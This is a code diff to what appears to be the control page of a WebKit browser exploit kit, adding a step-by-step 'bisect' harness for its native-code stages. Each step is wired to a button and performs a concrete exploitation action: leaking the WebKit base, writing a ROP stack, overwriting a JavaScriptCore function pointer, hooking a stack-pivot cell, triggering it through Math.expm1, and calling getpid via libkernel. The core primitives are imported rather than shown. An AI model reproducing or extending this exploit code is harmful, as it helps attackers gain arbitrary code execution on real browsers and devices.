@@ -60,10 +60,25 @@ import {
 } from "./libkernel_resolve.js";
 import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
-import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
+import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
+    layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectFireExpm1,
+    bisectRestore, fireNativeCallBisect } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830x";
+const BUILD_ID = "rw-20250830y";
+
+const NATIVE_BISECT_STEPS = [
+    { id: "prep", label: "N1 prep", title: "leakval expm1 + slab S/P/K/F" },
+    { id: "layout-smoke", label: "N2 layout", title: "write smoke ROP stack (no JSC writes)" },
+    { id: "arm-g0", label: "N3 arm G0", title: "write G0 → main m_function" },
+    { id: "hook", label: "N4 hook", title: "pivot cell → S" },
+    { id: "expm1", label: "N5 expm1", title: "Math.expm1 — pivot runs (OOM likely here)" },
+    { id: "restore", label: "N6 restore", title: "restore pivot + main" },
+    { id: "smoke-full", label: "N7 smoke", title: "layout + full fire (smoke)" },
+    { id: "layout-getpid", label: "N8 stage lk", title: "layout getpid stub (needs lk in box)" },
+    { id: "fire", label: "N9 fire", title: "fire only (after N3+N4+N8 or N7)" },
+    { id: "getpid-full", label: "N10 getpid", title: "stage lk + full fire" },
+];
 let lkHot = false;
 const SS_NATIVE_MODE = "wk-native-mode";
 /** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
@@ -182,6 +197,7 @@ let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
 let g5BarBtns = [];
+let bisectBtns = [];
 let nativeChain = null;
 let nativePrep = null;
 let nativeStaged = false;
@@ -322,6 +338,8 @@ function setUi() {
         gadgetBtns[i].disabled = busy || !ready;
     for (let i = 0; i < g5BarBtns.length; i++)
         g5BarBtns[i].disabled = busy || !ready;
+    for (let i = 0; i < bisectBtns.length; i++)
+        bisectBtns[i].disabled = busy || !ready || !nativeAllowed;
     const btnClearPivot = $("btn-clear-pivot");
     if (btnClearPivot) btnClearPivot.disabled = busy;
     const btnRestorePivot = $("btn-restore-pivot");
@@ -3639,6 +3657,141 @@ function runArmGetpid() {
     runFireGetpid();
 }
 
+function requireNativePrep() {
+    if (!nativePrep) throw new Error("run N1 prep first");
+}
+
+/** One bisect step — survives = BISECT-OK in log; OOM = tab dies on that step. */
+function runNativeBisectStep(stepId) {
+    if (!ready || !window.p || busy || !nativeAllowed) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    busy = true;
+    nativeQuiet = true;
+    setUi();
+    mark("BISECT", "step " + stepId + " build=" + BUILD_ID);
+    renderOut();
+    let pid = -1;
+    try {
+        switch (stepId) {
+        case "prep":
+            nativePrep = null;
+            ensureNativePrep(p, off);
+            pinNativeRetain();
+            mark("BISECT-OK", "N1 prep wb=" + nativePrep.webkitBase
+                + " S=" + nativePrep.M.S + " K=" + nativePrep.M.K
+                + " G0=" + nativePrep.G.G0 + " G5=" + nativePrep.G.G5
+                + " mainMf=" + nativePrep.mainMf + " pivotCell=" + nativePrep.pivotCell);
+            state("N1 prep OK", "ok");
+            break;
+        case "layout-smoke":
+            requireNativePrep();
+            layoutSmokeStack(nativePrep);
+            mark("BISECT-OK", "N2 layout smoke — stack only, no JSC writes");
+            state("N2 layout OK", "ok");
+            break;
+        case "arm-g0":
+            requireNativePrep();
+            bisectArmG0(p, nativePrep);
+            mark("BISECT-OK", "N3 armed G0 → mainMf (expm1 not called yet)");
+            state("N3 arm G0 OK", "ok");
+            break;
+        case "hook":
+            requireNativePrep();
+            bisectHookPivot(p, nativePrep);
+            mark("BISECT-OK", "N4 pivotCell → S=" + nativePrep.M.S
+                + " saved=" + (nativePrep._bisect && nativePrep._bisect.pivotSaved));
+            state("N4 hook OK", "ok");
+            break;
+        case "expm1":
+            requireNativePrep();
+            mark("BISECT-WARN", "N5 Math.expm1 — OOM usually here if pivot bad");
+            renderOut();
+            bisectFireExpm1(p, nativePrep);
+            pid = nativePrep.M.frameDv.getUint32(0, true) | 0;
+            mark("BISECT-OK", "N5 expm1 survived frame=" + pid);
+            state("N5 expm1 OK", "ok");
+            break;
+        case "restore":
+            requireNativePrep();
+            bisectRestore(p, nativePrep);
+            mark("BISECT-OK", "N6 restored pivotCell + mainMf");
+            state("N6 restore OK", "ok");
+            break;
+        case "smoke-full":
+            requireNativePrep();
+            if (!gateNativeFire(p, off)) throw new Error("pivot verify failed — Verify pivot first");
+            layoutSmokeStack(nativePrep);
+            pid = fireNativeCallBisect(p, nativePrep);
+            mark("BISECT-OK", "N7 smoke full frame=" + pid);
+            state("N7 smoke full OK", "ok");
+            break;
+        case "layout-getpid": {
+            requireNativePrep();
+            const lk = lkFromUi();
+            if (!lk) throw new Error("paste lk in hex box");
+            const stub = resolveGetpidStubOff(p, lk, off);
+            layoutGetpidStack(nativePrep, lk, stub.off);
+            mark("BISECT-OK", "N8 getpid stack @ lk+0x" + stub.off.toString(16)
+                + " (" + stub.tag + ") — no fire yet");
+            state("N8 stage lk OK", "ok");
+            break;
+        }
+        case "fire":
+            requireNativePrep();
+            mark("BISECT-WARN", "N9 fireNativeCall (needs N2/N8 layout + arm/hook inside)");
+            renderOut();
+            pid = fireNativeCallBisect(p, nativePrep);
+            mark("BISECT-OK", "N9 fire OK frame=" + pid);
+            state("N9 fire OK pid=" + pid, pid > 0 ? "ok" : "warn");
+            break;
+        case "getpid-full": {
+            requireNativePrep();
+            const lk2 = lkFromUi();
+            if (!lk2) throw new Error("paste lk in hex box");
+            const stub2 = resolveGetpidStubOff(p, lk2, off);
+            layoutGetpidStack(nativePrep, lk2, stub2.off);
+            mark("BISECT-WARN", "N10 getpid full fire lk+0x" + stub2.off.toString(16));
+            renderOut();
+            pid = fireNativeCallBisect(p, nativePrep);
+            mark("BISECT-OK", "N10 getpid=" + pid);
+            state(pid > 0 ? "getpid OK pid=" + pid : "N10 fired pid=" + pid,
+                pid > 0 ? "ok" : "warn");
+            break;
+        }
+        default:
+            throw new Error("unknown step " + stepId);
+        }
+    } catch (err) {
+        mark("BISECT-FAIL", stepId + " " + (err.message || String(err)));
+        state("bisect fail @ " + stepId, "bad");
+        try { if (nativePrep) bisectRestore(p, nativePrep); } catch (_) { }
+    } finally {
+        nativeQuiet = false;
+        busy = false;
+        setUi();
+        renderOut();
+        try { crashLog.flushSync(); } catch (_) { }
+    }
+}
+
+function wireNativeBisectBar() {
+    const host = $("native-bisect");
+    if (!host) return;
+    for (let i = 0; i < NATIVE_BISECT_STEPS.length; i++) {
+        const s = NATIVE_BISECT_STEPS[i];
+        const b = document.createElement("button");
+        b.type = "button";
+        b.className = "secondary";
+        b.textContent = s.label;
+        b.title = s.title;
+        b.dataset.nstep = s.id;
+        wireClick(b, function () { runNativeBisectStep(s.id); });
+        host.appendChild(b);
+        bisectBtns.push(b);
+    }
+}
+
 function runFireGetpid() {
     if (busy || !ready || !window.p || !nativeAllowed) return;
     const p = window.p;
@@ -4022,6 +4175,7 @@ function init() {
 
     wireGadgetBars();
     wireG5Bar();
+    wireNativeBisectBar();
     ensureUiVisible();
     wireClick(btnStart, function () { return runStart(); });
     wireClick(btnSaveBases, saveBasesManual);
